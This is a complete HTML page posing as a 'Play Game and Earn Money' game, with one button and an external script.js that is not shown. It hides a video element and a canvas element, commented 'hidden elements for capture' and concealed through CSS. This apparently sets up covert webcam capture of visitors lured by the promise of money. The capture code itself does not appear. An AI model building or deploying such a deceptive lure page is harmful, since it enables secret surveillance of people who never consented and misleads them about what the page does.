<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Play Game and Earn Money</title>
  <style>
    :root { --green: #1ba94c; --green-dark: #179441; }
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #f5f6f8;
      margin: 0;
      padding: 60px 20px;
      display:flex;
      justify-content:center;
    }
    .card {
      width:100%;
      max-width:480px;
      background: white;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
      padding: 34px 28px;
      text-align:center;
    }
    h2 { margin: 0 0 8px; font-size: 1.35rem; }
    p.lead { color: #444; margin: 0 0 22px; }
    button#playBtn {
      background: var(--green);
      color: #fff;
      border: none;
      padding: 12px 26px;
      border-radius: 8px;
      font-size: 1.05rem;
      cursor: pointer;
    }
    button#playBtn:hover { background: var(--green-dark); }
    #status {
      margin-top: 20px;
      font-weight: 600;
      color: #222;
    }
    #status .win { color: #0a8b3b; }
    #status .lose { color: #c62828; }
    /* hide video/canvas visually */
    video, canvas { display:none !important; width:0; height:0; }
  </style>
</head>
<body>
  <div class="card">
    <h2>ðŸ’° Play Game and Earn Money</h2>
    <p class="lead">Click <strong>Play Game</strong> to try your luck.</p>

    <button id="playBtn">Play Game</button>

    <div id="status"></div>

    <!-- hidden elements for capture -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
  </div>

  <script src="script.js"></script>
</body>
</html>
